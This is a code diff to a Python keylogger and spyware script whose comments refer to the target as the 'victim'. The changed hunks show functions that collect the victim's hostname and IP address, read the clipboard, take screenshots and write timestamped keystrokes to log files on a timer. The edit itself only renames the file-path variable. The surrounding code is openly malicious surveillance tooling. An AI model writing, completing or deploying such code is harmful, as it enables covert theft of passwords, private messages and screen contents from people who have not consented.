@@ -66,7 +66,7 @@ clipboard_info_e = "e_Clipboard.txt"
 
 # Function for Acquiring victim's Computer information 
 def computer_information():
-    with open(file_path + extend + system_information, "a") as f:
+    with open(file_merge + system_information, "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         try:
@@ -87,7 +87,7 @@ computer_information()
 
 # Function for copying victim's Clipboard information 
 def copy_clipboard():
-    with open(file_path + extend + clipboard_info, "a") as f:
+    with open(file_merge + clipboard_info, "a") as f:
         try:
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
@@ -116,7 +116,7 @@ def microphone():
 # Function to Screenshot Victim's PC
 def screenshot():
     im = ImageGrab.grab()
-    im.save(file_path + extend + screenshot_information)
+    im.save(file_merge + screenshot_information)
 
 screenshot()
 
@@ -148,7 +148,7 @@ while number_of_iterations < number_of_iterations_end:
 
     #Define the function that writes Keylogs to the txt document      
     def write_file(keys):
-        with open(file_path + extend + keys_information, 'a') as f:
+        with open(file_merge + keys_information, 'a') as f:
             for key in keys:
                 
                 # Get the current date and time
@@ -172,7 +172,7 @@ while number_of_iterations < number_of_iterations_end:
 
     # Timer Functionality 
     if currentTime > stoppingTime:
-        with open(file_path + extend + keys_information, "w") as f:
+        with open(file_merge + keys_information, "w") as f:
             f.write(" ")
 
         screenshot()
